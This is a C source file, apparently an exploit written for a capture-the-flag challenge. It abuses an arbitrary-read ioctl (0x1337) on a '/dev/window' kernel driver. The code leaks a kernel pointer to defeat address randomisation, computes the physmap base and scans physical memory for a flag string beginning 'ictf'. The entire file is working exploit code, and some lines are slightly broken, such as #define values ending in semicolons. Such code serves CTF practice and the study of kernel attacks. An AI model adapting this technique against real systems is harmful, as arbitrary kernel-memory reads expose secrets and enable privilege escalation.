#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>

void fatal(char *m){
  printf("ERROR: %s\n", m);
  exit(-1);
}

void hexdump(char *c, unsigned int Count){
  char * CharBuffer[16];
  int i;
  for (i = 0; i < Count; i += 1) {

        if ((i % 16) == 0) { printf("%08lx:", i); }

        printf(" %02x", c[i]);

        CharBuffer[i%16] = (c[i] > 31 && c[i] < 127 ? c[i] : '.');

        if ((i % 16) == 15) { printf(" %16s\n", CharBuffer); }
    }
}

struct ioctl_s {
  void *addr;
  char content[256];
};

// At this addr, there is a pointer to kernel
#define LEAK_ADDR 0xfffffe0000002f50;
#define OFFSET_TEXT 0x1000b59;

#define PHYSMAP_OFFSET 0x2c3b000;


int main() {
  int ret;
  unsigned long base_addr;
  int fd = open("/dev/window", O_RDWR);
  if (fd < 0){ fatal("opening /dev/window"); }

  struct  ioctl_s * leak = malloc(sizeof(struct ioctl_s));
  leak->addr = LEAK_ADDR;

  ret = ioctl(fd, 0x1337, leak);
  if (ret < 0){ fatal("ioctl"); }

  printf("LEAK: %lx\n",((unsigned long *)leak->content)[0]);
  base_addr = ((unsigned long *)leak->content)[0] - OFFSET_TEXT;
  printf("Base addr: %lx\n",base_addr);
  printf("Physmap addr: %lx\n",base_addr + 0x2c3b000);
  //hexdump(leak->content, 0x100);

  // Try to locate the flag in ram (because initramfs)
  leak->addr = base_addr + PHYSMAP_OFFSET;
  while (1){
    ret = ioctl(fd, 0x1337, leak);
    if (ret < 0){ fatal("ioctl"); }

    if (strstr(leak->content,"ictf") != NULL){
      printf("FLAG: %s\n", strstr(leak->content,"ictf"));
      break;
    }

    leak->addr += 0x100;
  }
}
